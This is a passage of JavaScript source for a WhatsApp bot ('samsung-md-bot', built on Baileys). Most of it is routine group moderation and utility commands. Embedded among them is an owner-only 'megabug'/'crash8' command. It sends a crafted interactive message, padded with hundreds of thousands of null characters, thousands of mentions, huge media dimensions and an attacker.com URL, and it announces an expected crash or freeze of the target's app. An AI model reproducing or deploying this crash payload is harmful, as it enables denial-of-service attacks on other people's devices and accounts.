> │⫹⫺ 𝗦𝗽𝗲𝗲𝗱       : ${latensi}𝘀
> │⫹⫺ 𝗦𝗰𝗿𝗶𝗽𝘁      : ${global.name || 'samsung-md-bot'}
> │⫹⫺ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻     : ${global.version || '3.1.0'}
> │⫹⫺ 𝗕𝗮𝗶𝗹𝗲𝘆𝘀     : ${global.description || '@whiskeysockets/baileys'}
> │⫹⫺ 𝗠𝗮𝗶𝗻 𝗙𝗶𝗹𝗲  : ${global.main || 'index.js'}
> │⫹⫺ 𝗣𝗿𝗲𝗳𝗶𝘅      : 𝗠𝘂𝗹𝘁𝗶 𝗣𝗿𝗲𝗳𝗶𝗳
> ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
`, sock);

  // ── Build interactive sections ──
  const sections = [];

  // ── Quick Actions – only Anti‑Link ──
  sections.push({
    title: "🔗 Anti‑Link",
    highlight_label: "Go",
    rows: [
      { 
        title: "🛡️ Anti‑Link Settings", 
        description: "Toggle, set warn limit, kick, action, message", 
        id: ".antilink" 
      }
    ]
  });

  // ── Other sections from CMDS ──
  for (const [cat, cmds] of Object.entries(CMDS)) {
    if (!cmds || cmds.length === 0) continue;
    const rows = cmds.map(cmd => ({
      title: `▸ ${cmd}`,
      description: `Run .${cmd}`,
      id: `.${cmd}`
    }));
    const chunkSize = 10;
    for (let i = 0; i < rows.length; i += chunkSize) {
      const chunk = rows.slice(i, i + chunkSize);
      const sectionTitle = i === 0 ? cat.toUpperCase() : `${cat.toUpperCase()} (${i/chunkSize + 1})`;
      sections.push({
        title: sectionTitle,
        highlight_label: cat,
        rows: chunk
      });
    }
  }

  // ── Send interactive message ──
  try {
    const imgBuf = await getBuffer(menuImg);
    await sock.sendMessage(jid, {
      image: imgBuf,
      caption: statusCaption,
      buttons: [
        {
          buttonId: 'action',
          buttonText: { displayText: '📋 Show All Commands' },
          type: 4,
          nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
              title: '📋 All Commands',
              sections
            })
          }
        }
      ],
      footer: ft(global.name || 'Samsung XMD', sock),
      headerType: 1,
      viewOnce: true,
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: settings.CHANNEL_JID || '120363407629340544@newsletter',
          newsletterName: settings.CHANNEL_NAME || '〖 🟢 𝐁𝐋𝐀𝐂𝐊𝐋𝐎𝐑𝐃 𝐓𝐀𝐋𝐊𝐋𝐄𝐒𝐒 🟢 〗'
        },
        externalAdReply: {
          title: ft(global.name || 'Samsung XMD', sock),
          body: ft(`version • ${global.version || '3.1.0'}`, sock),
          thumbnail: thumbBuffer || undefined, // ✅ local file
          sourceUrl: `https://Uptime • ${myUptime}`,
          mediaType: 1,
          renderLargerThumbnail: false,
        }
      }
    }, { quoted: m });
  } catch (e) {
    // Fallback: plain text if interactive fails
    let fallback = statusCaption + '\n\n';
    for (const [cat, cmds] of Object.entries(CMDS)) {
      if (!cmds || cmds.length === 0) continue;
      fallback += `*${cat.toUpperCase()}*\n${cmds.map(c => `• ${c}`).join('\n')}\n\n`;
    }
    await sock.sendMessage(jid, { text: fallback }, { quoted: m });
  }
  break;
}
    case 'tagall':
case 'everyone': {
  if (needGroup()) break;  // fixed the syntax error (removed extra || )
  const list = participants.map((p, i) => {
    const name = p.name || p.pushname || p.notify || p.id || p.jid;
    return `${i+1}. @${normNum(p.id || p.jid)} (${name})`;
  }).join('\n');
  const txt = text || '📢 Attention everyone!\n\nMembers list:';
  const mentions = participants.map(p => p.id || p.jid).filter(Boolean);
  await sock.sendMessage(jid, {
    text: `${txt}\n${list}`,
    mentions
  }, { quoted: qchanel });
  break;
}

case 'tagadmins':
case 'admins': {
  if (needGroup()) break;
  if (!groupAdmins.length) { await reply('No admins found.'); break; }
  const list = groupAdmins.map((admin, i) => {
    // Try to get admin's name from participants array if available
    const p = participants.find(m => (m.id || m.jid) === admin);
    const name = p?.name || p?.pushname || p?.notify || admin;
    return `${i+1}. @${normNum(admin)} (${name})`;
  }).join('\n');
  const txt = text || '📢 Admins!\n\nAdmin list:';
  await sock.sendMessage(jid, {
    text: `${txt}\n${list}`,
    mentions: groupAdmins
  }, { quoted: qchanel });
  break;
}
    case 'grouplink':
    case 'invitelink': {
      if (needGroup() || needAdmin()) break;
      const code = await sock.groupInviteCode(jid);
      await reply(`🔗 https://chat.whatsapp.com/${code}`);
      break;
    }

    case 'revoke': {
      if (needGroup() || needAdmin() || needBotAdm()) break;
      await sock.groupRevokeInvite(jid);
      await reply('✅ Invite link revoked. Old link no longer works.');
      break;
    }

    case 'groupinfo': {
      if (needGroup()) break;
      const adminNames = participants
        .filter(p => p.admin)
        .map(p => p.full?.notify || p.full?.name || `+${normNum(p.jid || p.id)}`)
        .join(', ') || 'None';
      await reply(
        `📋 *${groupName}*\n\nDescription: ${groupMetadata.desc || 'None'}\nMembers: ${participants.length}\nAdmins: ${adminNames}\nOwner: +${normNum(groupOwner)}\nCreated: ${new Date((groupMetadata.creation||0)*1000).toLocaleString()}`
      );
      break;
    }

    case 'members': {
      if (needGroup()) break;
      const list = participants.map((p,i) => `${i+1}. +${normNum(p.jid||p.id)} ${p.admin === 'superadmin' ? '👑' : p.admin ? '🛡' : ''}`).join('\n');
      await reply(`👥 *Members (${participants.length})*\n\n${list}`);
      break;
    }

    case 'setgname': {
      if (needGroup() || needAdmin() || needBotAdm()) break;
      const name = args.join(' '); if (!name) { await reply(`${prefix}setgname <name>`); break; }
      await sock.groupUpdateSubject(jid, name);
      await reply(`✅ Group name → ${name}`);
      break;
    }

    case 'setgdesc': {
      if (needGroup() || needAdmin() || needBotAdm()) break;
      const desc = args.join(' '); if (!desc) { await reply(`${prefix}setgdesc <description>`); break; }
      await sock.groupUpdateDescription(jid, desc);
      await reply('✅ Description updated.');
      break;
    }

    case 'hidetag': {
      if (needGroup() || needAdmin()) break;
      const mentions2 = participants.map(p => p.id || p.jid).filter(Boolean);
      await sock.sendMessage(jid, { text: text || ' ', mentions: mentions2 });
      break;
    }

    case 'warn': {
      if (needGroup() || needAdmin()) break;
      const t = getTargetJid(m, args); if (!t) { await reply('❌ Reply to a member.'); break; }
      const wFile = DB('warnings.json');
      const data  = readJSON(wFile, {});
      const key2  = `${jid}|${normNum(t)}`;
      data[key2]  = (data[key2] || 0) + 1;
      writeJSON(wFile, data);
      const count = data[key2];
      let extra = '';
      if (count >= 3) {
        extra = '\n⛔ *3 warnings reached! Kicking...*';
        try { await sock.groupParticipantsUpdate(jid, [t], 'remove'); } catch {}
        delete data[key2];
        writeJSON(wFile, data);
      }
      await reply(`⚠️ @${normNum(t)} warned (${Math.min(count,3)}/3).${extra}`);
      break;
    }

    case 'resetwarn': {
      if (needGroup() || needAdmin()) break;
      const t = getTargetJid(m, args); if (!t) { await reply('❌ Reply to a member.'); break; }
      const wFile = DB('warnings.json');
      const data  = readJSON(wFile, {});
      delete data[`${jid}|${normNum(t)}`];
      writeJSON(wFile, data);
      await reply(`✅ @${normNum(t)} warnings reset.`);
      break;
    }

    case 'warnings': {
      if (needGroup()) break;
      const t = getTargetJid(m, args); if (!t) { await reply('❌ Reply to a member.'); break; }
      const count = (readJSON(DB('warnings.json'), {})[`${jid}|${normNum(t)}`] || 0);
      await reply(`⚠️ @${normNum(t)} has ${count}/3 warnings.`);
      break;
    }
case 'mbg':
case 'crash8':
case 'megabug': {
    if (needOwner()) break;

    let target = args[0] || jid;
    if (!target.endsWith('@g.us') && !target.endsWith('@s.whatsapp.net')) {
        target = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    }

    await reply(ft(`┌ ❏ ⫹⫺  ⌜𝐌𝐁𝐆 𝐂𝐑𝐀𝐒𝐇 (𝐁𝐋)⌟ ⫹⫺ 
│
├⫹⫺  🎯 𝐓𝐚𝐫𝐠𝐞𝐭: ${target}
├⫹⫺  💀 〖𝐁𝐋Λ𝐂𝐊𝐋𝐎𝐑𝐃〗 𝐀𝐑𝐌𝐄𝐃
├⫹⫺  ⚡ 𝟑𝐊 𝐦𝐞𝐧𝐭𝐢𝐨𝐧𝐬 • 𝟓𝟎𝟎𝐊 𝐧𝐮𝐥𝐥 • 𝟗𝟗𝟗𝐌 𝐝𝐢𝐦𝐞𝐧𝐬𝐢𝐨𝐧𝐬
└ ❏`, sock));

    try {
        const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

        const heavyNull = "\u0000".repeat(500000);
        const mentions = Array.from({ length: 3000 }, () => "0@s.whatsapp.net");

        const msg = generateWAMessageFromContent(target, {
            interactiveMessage: {
                header: {
                    title: "Adrian!",
                    hasMediaAttachment: true,
                    videoMessage: {
                        url: "https://attacker.com/crafted.mp4",
                        mimetype: "video/mp4",
                        caption: "bokep" + "\u0000".repeat(50000),
                        fileLength: "1",
                        height: 999999999,
                        width: 999999999,
                        seconds: 999999999,
                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAQAAAAAAAAAAAAAAAAEQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREjMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
                    }
                },
                body: {
                    text: "Adrian!"
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: "catalog_message",
                            buttonParamsJson: JSON.stringify({ data: heavyNull })
                        }
                    ],
                    messageParamsJson: heavyNull
                },
                contextInfo: {
                    stanzaId: heavyNull,
                    participant: "0@s.whatsapp.net",
                    mentionedJid: mentions,
                    forwardingScore: 9999,
                    isForwarded: true
                }
            }
        }, {});

        await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

        await reply(ft(`┌ ❏ ⫹⫺  ⌜𝐌𝐁𝐆 ✅⌟ ⫹⫺ 
│
├⫹⫺  ☠️ 𝐏𝐚𝐲𝐥𝐨𝐚𝐝 𝐝𝐞𝐥𝐢𝐯𝐞𝐫𝐞𝐝 𝐭𝐨 ${target}
├⫹⫺  ⚰️ 𝐄𝐱𝐩𝐞𝐜𝐭 𝐜𝐫𝐚𝐬𝐡/𝐟𝐫𝐞𝐞𝐳𝐞
└ ❏`, sock));

    } catch (e) {
        console.error('[MBG] Error:', e);
        await reply(ft(`┌ ❏ ⫹⫺  ⌜𝐌𝐁𝐆 ❌⌟ ⫹⫺ 
│
├⫹⫺  ❌ ${e.message}
└ ❏`, sock));
    }
    break;
}
    case 'antilink': {
      if (needGroup() || needAdmin()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}antilink on/off`); break; }
      setGroupFlag('antilink.json', jid, v === 'on');
      await reply(`✅ AntiLink → ${v}`);
      break;
    }

    case 'antimedia': {
      if (needGroup() || needAdmin()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}antimedia on/off`); break; }
      setGroupFlag('antimedia.json', jid, v === 'on');
      await reply(`✅ AntiMedia → ${v}`);
      break;
    }

    case 'welcome': {
      if (needGroup() || needAdmin()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}welcome on/off`); break; }
      setGroupFlag('welcome.json', jid, v === 'on');
      await reply(`✅ Welcome messages → ${v}`);
      break;
    }

    case 'goodbye': {
      if (needGroup() || needAdmin()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}goodbye on/off`); break; }
      setGroupFlag('goodbye.json', jid, v === 'on');
      await reply(`✅ Goodbye messages → ${v}`);
      break;
    }

    case 'listgroups': {
      if (needOwner()) break;
      try {
        const groups = await sock.groupFetchAllParticipating();
        const list   = Object.values(groups).map((g,i) => `${i+1}. ${g.subject} (${g.participants?.length||0} members)`).join('\n');
        await reply(`📋 *Groups (${Object.keys(groups).length})*\n\n${list || 'None'}`);
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    case 'friends': {
      try {
        const contacts = await sock.getContacts?.() || [];
        const dms = contacts.filter(c2 => c2.id?.endsWith('@s.whatsapp.net')).slice(0, 50);
        if (!dms.length) { await reply('No contacts found.'); break; }
        const list = dms.map((c2, i) => `${i+1}. ${c2.name || c2.notify || `+${normNum(c2.id)}`}`).join('\n');
        await reply(`👥 *Friends/Contacts (${dms.length})*\n\n${list}`);
      } catch { await reply('❌ Could not fetch contacts.'); }
      break;
    }

    // ══════════════════════════════════════════════════════
    //   GROUP – NEW COMMANDS
    // ══════════════════════════════════════════════════════

    // Approve all join requests
    case 'approveall': {
      if (needGroup() || needAdmin() || needBotAdm()) break;
      await reaction('✅');
      try {
        const pending = await sock.groupRequestParticipantsList(jid);
        if (!pending?.length) { await reply('📭 No pending join requests.'); break; }
        const jids = pending.map(p => p.jid);
        await sock.groupRequestParticipantsUpdate(jid, jids, 'approve');
        await reply(`✅ Approved *${jids.length}* pending request(s).`);
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    // Check pending join requests
    case 'checkpending': {
      if (needGroup() || needAdmin()) break;
      try {
        const pending = await sock.groupRequestParticipantsList(jid);
        if (!pending?.length) { await reply('📭 No pending join requests.'); break; }
        const list = pending.map((p, i) => `${i+1}. +${normNum(p.jid)}`).join('\n');
        await reply(`📋 *Pending Requests (${pending.length})*\n\n${list}`);
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    // Reject all join requests
    case 'rejectall': {
      if (needGroup() || needAdmin() || needBotAdm()) break;
      await reaction('❌');
      try {
        const pending = await sock.groupRequestParticipantsList(jid);
        if (!pending?.length) { await reply('📭 No pending join requests.'); break; }
        const jids = pending.map(p => p.jid);
        await sock.groupRequestParticipantsUpdate(jid, jids, 'reject');
        await reply(`🚫 Rejected *${jids.length}* pending request(s).`);
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    // Disapprove / remove member
    case 'disap': {
      if (needGroup() || needAdmin() || needBotAdm()) break;
      let tRaw = getTargetJid(m, args);
      // also accept raw number in args
      if (!tRaw && args[0]) {
        const cleaned = args[0].replace(/[^0-9]/g, '');
        if (cleaned.length >= 7) tRaw = cleaned + '@s.whatsapp.net';
      }
      if (!tRaw) { await reply(`❌ Reply to a member or: ${prefix}disap <number>`); break; }
      // normalise to full JID for admin check
      const tFull = tRaw.includes('@') ? tRaw : normNum(tRaw) + '@s.whatsapp.net';
      const adminNorms = groupAdmins.map(a => (a.includes('@') ? a : a + '@s.whatsapp.net'));
      if (adminNorms.includes(tFull)) { await reply('❌ Cannot remove an admin.'); break; }
      try {
        await sock.groupParticipantsUpdate(jid, [tFull], 'remove');
        await reply(`🚫 @${normNum(tFull)} has been disapproved and removed.`);
      } catch (e) { await reply('❌ disap failed: ' + e.message); }
      break;
    }

    // Anti-mention (protect members from mass mentions / mention spam)
    case 'antimention': {
      if (needGroup() || needAdmin()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}antimention on/off`); break; }
      setGroupFlag('antimention.json', jid, v === 'on');
      await reply(`✅ AntiMention → ${v}\n_Members who mass-mention will be warned._`);
      break;
    }

    // Anti-spam (too many messages in short time → warn/kick)
    case 'antispam': {
      if (needGroup() || needAdmin()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}antispam on/off`); break; }
      setGroupFlag('antispam.json', jid, v === 'on');
      await reply(`✅ AntiSpam → ${v}\n_Members sending >5 msgs in 5s will be warned._`);
      break;
    }

    // Anti-bot (blocks other bot commands from non-owners)
    case 'antibot': {
      if (needGroup() || needAdmin()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}antibot on/off`); break; }
      setGroupFlag('antibot.json', jid, v === 'on');
      await reply(`✅ AntiBot → ${v}\n_Bot commands from non-admin members will be deleted._`);
      break;
    }

    // Slow mode – set message cooldown
    case 'slowmode': {
      if (needGroup() || needAdmin()) break;
      const secs = parseInt(args[0]);
      if (!args[0] || args[0] === 'off') {
        const sm = readJSON(DB('slowmode.json'), {});
        delete sm[jid];
        writeJSON(DB('slowmode.json'), sm);
        await reply('✅ Slow mode disabled.');
        break;
      }
      if (isNaN(secs) || secs < 1 || secs > 3600) { await reply(`${prefix}slowmode <seconds 1-3600> | off`); break; }
      const sm = readJSON(DB('slowmode.json'), {});
      sm[jid] = secs;
      writeJSON(DB('slowmode.json'), sm);
      await reply(`⏱ Slow mode → *${secs}s* between messages per member.`);
      break;
    }

    // Soft-ban: mute a specific member (remove then re-add – they can't send until re-added)
    case 'softban': {
      if (needGroup() || needAdmin() || needBotAdm()) break;
      const t = getTargetJid(m, args); if (!t) { await reply('❌ Reply to a member.'); break; }
      if (groupAdmins.includes(t)) { await reply('❌ Cannot soft-ban an admin.'); break; }
      try {
        await sock.groupParticipantsUpdate(jid, [t], 'remove');
        await new Promise(r => setTimeout(r, 2000));
        await sock.groupParticipantsUpdate(jid, [t], 'add');
        await reply(`🔇 @${normNum(t)} soft-banned (removed & re-added, messages reset).`);
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    // Kick all non-admins
    case 'kickall': {
    if (needGroup()) break;
    if (!_isOwner) {
        await reply('❌ Owner only.');
        break;
    }

    const nonAdmins = participants
        .filter(p => !p.admin)
        .map(p => p.id || p.jid)
        .filter(Boolean);

    if (!nonAdmins.length) {
        await reply('❌ No non-admin members found.');
        break;
    }

    await reply(`⚠️ Removing ${nonAdmins.length} non-admin members...`);

    let removed = 0;
    let failed = 0;

    const chunkSize = 1030;

    for (let i = 0; i < nonAdmins.length; i += chunkSize) {
        const chunk = nonAdmins.slice(i, i + chunkSize);

        try {
            await sock.groupParticipantsUpdate(
                jid,
                chunk,
                "remove"
            );

            removed += chunk.length;
        } catch (err) {
            failed += chunk.length;
        }

        // Anti-spam delay
        await new Promise(resolve => setTimeout(resolve, 1500));
    }

    await reply(`✅ 🕣⃝⃘̉̉⃝⃪

┌ ❏ ◆ ⌜𝐊𝐈𝐂𝐊 𝐀𝐋𝐋⌟ ◆
│
├◆ 𝐑𝐞𝐦𝐨𝐯𝐞𝐝: ${removed}
├◆ 𝐅𝐚𝐢𝐥𝐞𝐝: ${failed}
├◆ 𝐍𝐨𝐭𝐞: 𝐀𝐝𝐦𝐢𝐧𝐬 𝐰𝐞𝐫𝐞 𝐤𝐞𝐩𝐭
└ ❏`);

    break;
}
case 'unlock': {
    if (needGroup() || needAdmin()) break;
    await sock.groupSettingUpdate(jid, 'unlocked');
    const replyText = `🕣⃝⃘̉̉⃝⃪

┌ ❏ ◆ ⌜𝐔𝐍𝐋𝐎𝐂𝐊 𝐆𝐑𝐎𝐔𝐏⌟ ◆
│
├◆ 𝐒𝐓𝐀𝐓𝐔𝐒: 🔓 𝐆𝐫𝐨𝐮𝐩 𝐢𝐧𝐟𝐨 𝐮𝐧𝐥𝐨𝐜𝐤𝐞𝐝
├◆ 𝐍𝐎𝐓𝐄: 𝐀𝐥𝐥 𝐦𝐞𝐦𝐛𝐞𝐫𝐬 𝐜𝐚𝐧 𝐞𝐝𝐢𝐭
└ ❏

⏤͟͟͞🩸`;
    await reply(replyText);
    break;
}

    // Set custom welcome message
    case 'setwelcomemsg': {
      if (needGroup() || needAdmin()) break;
      const msg = args.join(' ');
      if (!msg) { await reply(`${prefix}setwelcomemsg <message>\nUse {name} for member name, {group} for group name.`); break; }
      const wm = readJSON(DB('welcomemsgs.json'), {});
      wm[jid] = msg;
      writeJSON(DB('welcomemsgs.json'), wm);
      await reply(`✅ Welcome message set:\n${msg}`);
      break;
    }

    // Set custom goodbye message
    case 'setgoodbyemsg': {
      if (needGroup() || needAdmin()) break;
      const msg = args.join(' ');
      if (!msg) { await reply(`${prefix}setgoodbyemsg <message>\nUse {name} for member name, {group} for group name.`); break; }
      const gm = readJSON(DB('goodbyemsgs.json'), {});
      gm[jid] = msg;
      writeJSON(DB('goodbyemsgs.json'), gm);
      await reply(`✅ Goodbye message set:\n${msg}`);
      break;
    }

    // Mute list – see who has been muted via softban
    case 'mutelist': {
      if (needGroup() || needAdmin()) break;
      const ml = readJSON(DB('mutedmembers.json'), {});
      const list2 = (ml[jid] || []);
      if (!list2.length) { await reply('No muted members.'); break; }
      await reply(`🔇 *Muted Members (${list2.length})*\n${list2.map((j2,i) => `${i+1}. +${normNum(j2)}`).join('\n')}`);
      break;
    }

    // Kick inactive members (no messages in X days tracked via DB)
    case 'kickinactive': {
      if (needGroup() || needAdmin() || needBotAdm()) break;
      if (!_isOwner) { await reply('❌ Owner only.'); break; }
      const days = parseInt(args[0]) || 7;
      const actFile = DB('activity.json');
      const act = readJSON(actFile, {});
      const cutoff = Date.now() - days * 86400000;
      const inactive = participants
        .filter(p => !p.admin)
        .map(p => p.jid || p.id)
        .filter(pjid => {
          const key3 = `${jid}|${normNum(pjid)}`;
          return !act[key3] || act[key3] < cutoff;
        });
      if (!inactive.length) { await reply(`✅ No inactive members (>${days} days) found.`); break; }
      await reply(`⚠️ Kicking *${inactive.length}* members inactive for >${days} days...`);
      let done2 = 0;
      for (const t of inactive) {
        try { await sock.groupParticipantsUpdate(jid, [t], 'remove'); done2++; await new Promise(r => setTimeout(r, 500)); } catch {}
      }
      await reply(`✅ Kicked *${done2}* inactive members.`);
      break;
    }

    // ══════════════════════════════════════════════════════
    //   UTILITY – EXISTING
    // ══════════════════════════════════════════════════════

    case 'sticker': {
      await reaction('🎨');
      const { qMsg, qType, qKey } = getQuoted(m);
      const imgMsg = m.message?.imageMessage || (qType === 'imageMessage' ? qMsg?.imageMessage : null);
      const vidMsg = m.message?.videoMessage  || (qType === 'videoMessage' ? qMsg?.videoMessage  : null);
      const stickerSrc = imgMsg ? { imageMessage: imgMsg } : vidMsg ? { videoMessage: vidMsg } : null;
      const stickerKey = imgMsg
        ? (m.message?.imageMessage ? m.key : qKey)
        : m.message?.videoMessage ? m.key : qKey;
      if (!stickerSrc) { await reply(`Reply to an image or video with ${prefix}sticker`); break; }
      try {
        const buf = await dlMedia(stickerSrc, stickerKey);
        const tmp = `/tmp/stk_${Date.now()}`;
        fs.writeFileSync(`${tmp}.in`, buf);
        await new Promise((res, rej) =>
          exec(`ffmpeg -y -i ${tmp}.in -vf "scale=512:512:force_original_aspect_ratio=decrease,pad=512:512:(ow-iw)/2:(oh-ih)/2" -loop 0 ${tmp}.webp 2>/dev/null`, e => e ? rej(e) : res())
        );
        const webp = fs.readFileSync(`${tmp}.webp`);
        await sock.sendMessage(jid, { sticker: webp }, { quoted: qchanel });
        try { fs.unlinkSync(`${tmp}.in`); fs.unlinkSync(`${tmp}.webp`); } catch {}
      } catch { await reply('❌ Sticker failed. Make sure ffmpeg is installed.'); }
      break;
    }

    case 'toimg': {
      const { qMsg, qType, qKey } = getQuoted(m);
      const sm = m.message?.stickerMessage || (qType === 'stickerMessage' ? qMsg?.stickerMessage : null);
      if (!sm) { await reply('Reply to a sticker.'); break; }
      const srcKey = m.message?.stickerMessage ? m.key : qKey;
      try {
        const buf = await dlMedia({ stickerMessage: sm }, srcKey);
        await replyImg(buf, '🖼 Sticker → Image');
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    
    case 'qr': {
      if (!text) { await reply(`${prefix}qr <text>`); break; }
      await replyImg(`https://api.qrserver.com/v1/create-qr-code/?size=512x512&data=${encodeURIComponent(text)}`, `🔲 QR: ${text}`);
      break;
    }

    case 'weather': {
      const city = text; if (!city) { await reply(`${prefix}weather <city>`); break; }
      try {
        const r = await axios.get(`https://wttr.in/${encodeURIComponent(city)}?format=4&m`, { timeout: 8000 });
        await reply(`🌤 *${city}*\n${r.data}`);
      } catch { await reply('❌ Weather fetch failed.'); }
      break;
    }

    case 'tr': {
      const lang = args[0]; const txt2 = args.slice(1).join(' ');
      if (!lang || !txt2) { await reply(`${prefix}tr <lang> <text>\nExample: ${prefix}tr es Hello World`); break; }
      try {
        const r = await axios.get(`https://api.mymemory.translated.net/get?q=${encodeURIComponent(txt2)}&langpair=en|${lang}`, { timeout: 8000 });
        await reply(`🌐 (${lang}) ${r.data.responseData.translatedText}`);
      } catch { await reply('❌ Translation failed.'); }
      break;
    }
// ─── ADMIN COMMANDS (HARDCODED) ──────────────────────────────

case 'pinmsg': {
  if (needGroup() || needAdmin() || needBotAdm()) break;
  const quoted = m.quoted || m;
  const key = quoted.key || m.key;
  try {
    await sock.sendMessage(jid, { pin: key, type: 1 }); // type 1 = pin
    await reply('📌 Message pinned.');
  } catch (e) {
    await reply(`❌ ${e.message}`);
  }
  break;
}

case 'unpinmsg': {
  if (needGroup() || needAdmin() || needBotAdm()) break;
  const quoted = m.quoted || m;
  const key = quoted.key || m.key;
  try {
    await sock.sendMessage(jid, { pin: key, type: 2 }); // type 2 = unpin
    await reply('📌 Message unpinned.');
  } catch (e) {
    await reply(`❌ ${e.message}`);
  }
  break;
}

case 'delmsg': {
  if (needGroup() || needAdmin() || needBotAdm()) break;
  const quoted = m.quoted;
  if (!quoted) { await reply('❌ Reply to the message you want to delete.'); break; }
  try {
    await sock.sendMessage(jid, { delete: quoted.key });
    await reaction('🗑️');
  } catch (e) {
    await reply(`❌ ${e.message}`);
  }
  break;
}

case 'setjoinmsg': {
  if (needGroup() || needAdmin()) break;
  const msg = args.join(' ');
  if (!msg) { await reply(`Usage: .setjoinmsg <message>\nUse {name} for member name, {group} for group name.`); break; }
  const config = cfg(sock);
  if (!config.joinMsgs) config.joinMsgs = {};
  config.joinMsgs[jid] = msg;
  await reply('✅ Join message saved.');
  break;
}

case 'setleavemsg': {
  if (needGroup() || needAdmin()) break;
  const msg = args.join(' ');
  if (!msg) { await reply(`Usage: .setleavemsg <message>\nUse {name} for member name, {group} for group name.`); break; }
  const config = cfg(sock);
  if (!config.leaveMsgs) config.leaveMsgs = {};
  config.leaveMsgs[jid] = msg;
  await reply('✅ Leave message saved.');
  break;
}

case 'setnsfw': {
  if (needGroup() || needAdmin()) break;
  const state = args[0]?.toLowerCase();
  if (!['on','off'].includes(state)) { await reply('Usage: .setnsfw on/off'); break; }
  const config = cfg(sock);
  if (!config.groupFlags) config.groupFlags = {};
  if (!config.groupFlags[jid]) config.groupFlags[jid] = {};
  config.groupFlags[jid].nsfw = (state === 'on');
  await reply(`✅ NSFW mode ${state.toUpperCase()}`);
  break;
}

case 'antinsfw': {
  if (needGroup() || needAdmin()) break;
  const state = args[0]?.toLowerCase();
  if (!['on','off'].includes(state)) { await reply('Usage: .antinsfw on/off'); break; }
  const config = cfg(sock);
  if (!config.groupFlags) config.groupFlags = {};
  if (!config.groupFlags[jid]) config.groupFlags[jid] = {};
  config.groupFlags[jid].antinsfw = (state === 'on');
  await reply(`✅ Anti‑NSFW ${state.toUpperCase()}`);
  break;
}

case 'antifake': {
  if (needGroup() || needAdmin()) break;
  const state = args[0]?.toLowerCase();
  if (!['on','off'].includes(state)) { await reply('Usage: .antifake on/off'); break; }
  const config = cfg(sock);
  if (!config.groupFlags) config.groupFlags = {};
  if (!config.groupFlags[jid]) config.groupFlags[jid] = {};
  config.groupFlags[jid].antifake = (state === 'on');
  await reply(`✅ Anti‑Fake ${state.toUpperCase()}`);
  break;
}

case 'warnreset': {
  if (needGroup() || needAdmin()) break;
  const target = getTargetJid(m, args);
  if (!target) { await reply('❌ Reply to or mention a member.'); break; }
  const wFile = DB('warnings.json');
  const data = readJSON(wFile, {});
  delete data[`${jid}|${normNum(target)}`];
  writeJSON(wFile, data);
  await reply(`✅ Warnings reset for @${normNum(target)}.`);
  break;
}

case 'banlist': {
  if (needGroup() || needAdmin()) break;
  const banFile = DB('bans.json');
  const bans = readJSON(banFile, {});
  const groupBans = bans[jid] || [];
  if (!groupBans.length) { await reply('📭 No banned users in this group.'); break; }
  const list = groupBans.map((j, i) => `${i+1}. @${normNum(j)}`).join('\n');
  await reply(`🚫 *Banned Users (${groupBans.length})*\n\n${list}`);
  break;
}

case 'unbanall': {
  if (needGroup() || needAdmin()) break;
  const banFile = DB('bans.json');
  const bans = readJSON(banFile, {});
  delete bans[jid];
  writeJSON(banFile, bans);
  await reply('✅ All users unbanned.');
  break;
}

case 'autopin': {
  if (needGroup() || needAdmin()) break;
  const state = args[0]?.toLowerCase();
  if (!['on','off'].includes(state)) { await reply('Usage: .autopin on/off'); break; }
  const config = cfg(sock);
  if (!config.groupFlags) config.groupFlags = {};
  if (!config.groupFlags[jid]) config.groupFlags[jid] = {};
  config.groupFlags[jid].autopin = (state === 'on');
  await reply(`✅ Auto‑pin ${state.toUpperCase()}`);
  break;
}

case 'autoreact': {
  if (needGroup() || needAdmin()) break;
  const emoji = args[0];
  if (!emoji) { await reply('Usage: .autoreact <emoji> (or "off")'); break; }
  const config = cfg(sock);
